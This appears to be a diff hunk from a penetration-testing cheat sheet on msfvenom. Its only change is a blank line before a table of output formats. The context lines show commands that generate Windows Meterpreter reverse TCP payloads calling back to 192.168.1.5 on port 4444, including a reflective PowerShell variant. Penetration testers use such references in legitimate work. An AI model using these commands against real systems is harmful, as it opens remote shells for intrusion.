@@ -1586,6 +1586,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1
 ```
 - 3. Use different output formats
+
 |Format	|Command	|use Case|
 |----|----|----|
 |EXE|	-f exe	|Windows executables|
